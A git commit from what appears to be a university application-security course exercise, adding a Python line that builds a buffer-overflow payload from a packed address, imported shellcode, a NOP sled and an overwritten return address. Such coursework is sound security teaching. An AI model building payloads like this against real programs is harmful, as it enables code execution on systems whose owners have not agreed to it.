132c1273556ca338aae237d7d497b7a96ee483a6
bencivjan <bcivjan2@illinois.edu>
2022-09-13 18:42:12 -0500

    Finish 1.2.5

--- AppSec/1.2.5.py
+++ AppSec/1.2.5.py
@@ -5,3 +5,5 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+# shellcode = 23 bytes
+sys.stdout.buffer.write(pack('<I', 0x40000010) + shellcode + b'\x90'*85 + pack('<I', 0xfffefd70))
